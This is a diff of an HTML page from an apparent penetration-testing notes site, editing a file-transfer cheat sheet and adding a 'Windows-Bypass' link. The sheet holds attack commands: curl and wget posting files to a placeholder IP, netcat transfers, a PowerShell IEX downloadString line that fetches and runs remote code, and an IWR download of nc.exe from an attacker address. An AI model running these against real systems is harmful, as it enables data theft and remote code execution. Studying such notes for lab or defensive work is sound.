@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2019-04-06T02:57:14 EDT">
+<meta name="revised" content="2019-04-18T01:16:24 EDT">
 <title>File Transfer :: DocDock Documentation</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -116,6 +116,13 @@
     </div>
 </li>
     </ul>
+</li>
+<li data-nav-id="/concepts/bypass/" class="dd-item">
+    <div>
+        <a href="/concepts/bypass/">
+            Windows-Bypass
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
 </li>
     </ul>
 </li>
@@ -483,13 +490,15 @@
     
     
     
-    <pre><code>############################################Linux
+    <pre><code>##################Linux##########################
 
 1# Python http server
 listener = python3 -m http.server 9090
+listener = python -m simpleHTTPServer 9090
 upload = curl -F 'data=@home/Documents' IP_ADDRESS
 download = curl http://IP_ADDRESS -o file
 Note for wget post method youll need to use netcat instead of python doesn't support post.
+
 upload = wget --post-file user.txt http://IP_ADDRESS:PORT
 download = wget http://address:9090/filename
 2# Netcat notice with this method , sender &lt;, reciever &gt;. -w wait, -l listener -p port
@@ -497,27 +506,24 @@ upload = nc -w 3 [your_ip] 1337 &lt; file.txt
 listener = nc -lp 1337 &gt; file.txt
 if you'd like to compress and decompress sending a whole image with the dd comand, lol. wow
 https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/
-############################################Windows —
+</code></pre>
+
+<pre><code>#####################Window##############
 
 Download
 ​```
-
-
-
 # Python http server 
-
 ​```
 listener = python3 -m http.server 9090
+listener = python -m SimpleHTTPServer 9090
 
-IEX(New-Object Net.WebClient).downloadString('http://IP_ADDRESS/file-needed')
+Invoke = IEX(New-Object Net.WebClient).downloadString('http://IP_ADDRESS/file-needed')
+Invoke-Web-Request = powershell IWR &quot;http://10.10.14.49/nc.exe&quot; -OutFile nc.exe
 ############################################
 Upload using SMB to share files i would like to note that that impacket might hang and since its written in python. ps -ef|grep python.
 #target machine
   net use z: \\IP_ADDRESS\share
 ​```
-
-
-
 # kali machine
 
 ​```
@@ -530,9 +536,6 @@ note if you have issues try this method
 #target machine
   net use z: \\IP_ADDRESS\share
 ​```
-
-
-
 # kali machine
 
   impacket-smbserver share `pwd` | ` not '
